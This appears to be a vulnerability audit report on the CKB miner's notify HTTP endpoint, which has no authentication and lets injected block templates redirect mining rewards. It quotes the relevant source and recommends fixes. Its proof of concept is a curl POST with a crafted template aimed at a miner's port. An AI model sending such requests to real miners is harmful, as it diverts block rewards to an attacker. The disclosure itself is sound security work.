All code claims check out against the actual source. Let me verify the key details:

- `handle` at lines 358–369: no auth check, deserializes any body as `BlockTemplate` [1](#0-0) 
- `update_block_template` at lines 293–312: `fetch_update` closure accepts if `id != work_id || id == 0` — trivially bypassed [2](#0-1) 
- `current_work_id` initialized to `0` at line 163 [3](#0-2) 
- `MinerClientConfig` has no token/secret field — only `rpc_url`, `poll_interval`, `block_on_submit`, `listen` [4](#0-3) 
- `BlockTemplate.cellbase` field confirmed [5](#0-4) 

---

Audit Report

## Title
Unauthenticated Block Template Injection via Miner Notify HTTP Endpoint - (File: `miner/src/client.rs`)

## Summary
When notify mode is enabled (`config.listen` is set), the miner binds a raw TCP listener and dispatches every accepted HTTP connection to `handle`, which deserializes the body as a `BlockTemplate` and forwards it to `update_block_template` with no authentication, IP restriction, or HMAC/token check. An attacker who can reach the listen port can POST a crafted template whose `cellbase` outputs point to the attacker's lock script; the miner will solve the PoW and submit a valid block that pays the block reward to the attacker.

## Finding Description
`spawn_background` (L204–232) starts `listen_block_template_notify` when `config.listen` is set. Every accepted connection is dispatched to the free function `handle` (L358–369):

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
```

There is no `Authorization` header check, no IP allowlist, and no HMAC/token verification. Any well-formed JSON body that deserializes as `BlockTemplate` is forwarded directly to `update_block_template` (L293–312):

```rust
fn update_block_template(&self, block_template: BlockTemplate) {
    let work_id = block_template.work_id.into();
    let updated = |id| {
        if id != work_id || id == 0 {
            Some(work_id)
        } else {
            None
        }
    };
    ...
}
```

The `fetch_update` closure accepts the incoming template whenever `id != work_id` (current stored value differs from incoming) **or** `id == 0` (initial state). Since `current_work_id` is initialized to `0` (L163), every template is accepted unconditionally at startup. After the first legitimate template advances the counter to N, an attacker sends `work_id = 0` (satisfies `id != work_id` since N ≠ 0) and the template is accepted. The guard is a deduplication hint, not a security boundary.

`BlockTemplate.cellbase` (block_template.rs L75) is the exact field that determines who receives the block reward. The miner converts the template to `Work` and dispatches it to PoW workers verbatim; no field is cross-checked against the trusted RPC node. `MinerClientConfig` (miner.rs L19–30) has no token or secret field, confirming there is no mechanism to add authentication.

## Impact Explanation
A successful injection causes the miner to solve a valid PoW puzzle over an attacker-controlled block. The CKB node validates the PoW and commits the block; the block reward (primary + secondary issuance) is paid to the attacker's lock script. At mining-pool scale — where notify mode is the standard deployment pattern for multi-machine setups — an attacker who can reach multiple miners' notify ports can continuously siphon block rewards. This constitutes concrete, repeatable economic damage matching the allowed impact class: **Critical — Vulnerabilities which could easily damage CKB economy**.

## Likelihood Explanation
- Notify mode is a documented, production-supported opt-in feature explicitly designed for multi-machine deployments where the miner binds to a non-loopback address.
- The exploit requires only a single HTTP POST with a valid JSON body — no credentials, no prior state, no cryptographic material.
- The `work_id` bypass is unconditional at startup (`id == 0`) and trivially achievable at any time by sending `work_id = 0` once the legitimate counter has advanced past 0.
- Even loopback-bound deployments are reachable by any co-located process (compromised dependency, shared hosting, container escape).
- The attacker needs only public chain state (`parent_hash`, `compact_target`) to craft a valid template, both of which are available from any CKB RPC endpoint.

## Recommendation
**Short term:** Add a configurable shared-secret bearer token to `MinerClientConfig`. In `handle`, reject any request whose `Authorization` header does not match the configured token before deserializing the body.

**Long term:** After accepting a notify template, cross-check `parent_hash` and `compact_target` against values independently fetched from the trusted RPC node (`get_block_template` / `get_tip_header`). Treat all data arriving on the notify port as untrusted input.

## Proof of Concept
With the miner configured as `listen = "0.0.0.0:8888"`:

```bash
# At startup current_work_id == 0, so id == 0 branch fires unconditionally.
# After first legitimate template sets counter to N, send work_id=0 (N != 0 satisfies id != work_id).
curl -X POST http://<miner-ip>:8888 \
  -H "Content-Type: application/json" \
  -d '{
    "version": "0x0",
    "compact_target": "0x1e083126",
    "current_time": "0x174c45e17a3",
    "number": "0x401",
    "epoch": "0x7080019000001",
    "parent_hash": "<current tip hash from node>",
    "cycles_limit": "0xd09dc300",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [], "transactions": [], "proposals": [],
    "cellbase": {
      "cycles": null,
      "data": { "<cellbase tx with outputs locked to attacker address>" },
      "hash": "<matching hash>"
    },
    "work_id": "0x0",
    "dao": "0xd495a106684401001e47c0ae1d5930009449d26e32380000000721efd0030000"
  }'
```

The miner accepts the template (startup: `id == 0`; later: `id != work_id`), mines it, and calls `submit_block` with the attacker-controlled block. The node verifies PoW and commits the block; the block reward is paid to the attacker's lock script.

### Citations

**File:** miner/src/client.rs (L162-164)
```rust
        Client {
            current_work_id: Arc::new(AtomicU64::new(0)),
            rpc: Rpc::new(uri, handle.clone()),
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** util/app-config/src/configs/miner.rs (L19-30)
```rust
pub struct ClientConfig {
    /// CKB node RPC endpoint.
    pub rpc_url: String,
    /// The poll interval in seconds to get work from the CKB node.
    pub poll_interval: u64,
    /// By default, miner submits a block and continues to get the next work.
    ///
    /// When this is enabled, miner will block until the submission RPC returns.
    pub block_on_submit: bool,
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** util/jsonrpc-types/src/block_template.rs (L72-77)
```rust
    /// Provided cellbase transaction template.
    ///
    /// Miners must use it as the cellbase transaction without changes in the assembled block.
    pub cellbase: CellbaseTemplate,
    /// Work ID. The miner must submit the new assembled and resolved block using the same work ID.
    pub work_id: Uint64,
```
